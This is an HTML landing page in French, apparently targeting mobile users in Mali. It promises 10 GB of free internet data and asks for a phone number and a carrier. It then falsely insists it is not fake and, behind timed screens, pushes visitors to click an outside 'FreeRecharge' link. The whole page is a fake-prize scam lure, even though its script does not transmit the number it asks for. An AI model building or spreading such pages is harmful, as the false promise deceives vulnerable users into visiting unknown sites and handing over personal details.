<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Félicitations!</title>
    <style>
        @keyframes rainbow {
            0% { background-color: red; }
            25% { background-color: yellow; }
            50% { background-color: green; }
            75% { background-color: blue; }
            100% { background-color: red; }
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #c3ec52 0%, #0ba29d 100%);
            animation: rainbow 10s infinite;
        }
        .container {
            width: 90%;
            max-width: 360px;
            text-align: center;
            background-color: rgba(255, 255, 255, 0.8);
            padding: 15px;
            border-radius: 12px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }
        select, .phone-input {
            padding: 8px;
            width: 100%;
            margin-top: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 12px;
            background-color: #f9f9f9;
            animation: rainbow 10s infinite;
        }
        button {
            padding: 8px 16px;
            width: 100%;
            background-color: #ff5722;
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #e64a19;
        }
        .large-text {
            font-size: 32px; /* Ajusté pour les écrans de téléphone */
        }
    </style>
</head>
<body>
    <div class="container" id="page1">
        <h1 class="large-text">Félicitations!</h1>
        <p>Vous avez gagné 10 Go de Data Internet!</p>
        <input type="text" class="phone-input" placeholder="+223 Numéro de téléphone" maxlength="8">
        <p>Veuillez choisir votre réseau :</p>
        <select>
            <option value="Moov Africa ML">Moov Africa ML</option>
            <option value="Orange ML">Orange ML</option>
            <option value="Telecel ML">Telecel ML</option>
        </select>
        <button onclick="showReceivedMessage()">Cliquez maintenant !</button>
    </div>
    <div class="container" id="page2" style="display: none;">
        <h1 class="large-text" style="font-size: 50px;">Lisez bien !</h1> <!-- Ajusté pour les écrans de téléphone -->
        <p>Ce site n'est pas une Fake, c'est un site créé pour aider les jeunes sensibilisateurs.</p>
        <p>La situation sécuritaire au Mali reste préoccupante avec des attaques terroristes dans le centre du pays et Les récentes inondations au Mali ont touché plusieurs causant des dégâts</p>
        <p><a href="https://anujxyz.shop/FreeRecharge?id=7646890260">Cliquez sur ce lien</a> et vous verrez un message en noir. Attendez 10 secondes après avoir cliqué sur le lien.</p>
        <p id="wait-message" style="display: none;">Veuillez cliquer sur le lien avant 20 secondes...</p>
    </div>
    <div class="container" id="page3" style="display: none;">
        <h1 style="font-size: 17.5px;">Vous avez reçu ?</h1>
        <p></p>
        <p>Veuillez patienter s'il vous plaît.</p>
    </div>
    <script>
        function showReceivedMessage() {
            const phoneNumber = document.querySelector('.phone-input').value;
            if (phoneNumber.length <= 8) {
                document.getElementById('page1').style.display = 'none';
                document.getElementById('page2').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('wait-message').style.display = 'block';
                    setTimeout(() => {
                        document.getElementById('page2').style.display = 'none';
                        document.getElementById('page3').style.display = 'block';
                    }, 16000); // Changement de 5 à 16 secondes
                }, 10000);
            } else {
                alert("Le numéro ne doit pas dépasser 8 chiffres.");
            }
        }
    </script>
</body>
</html>
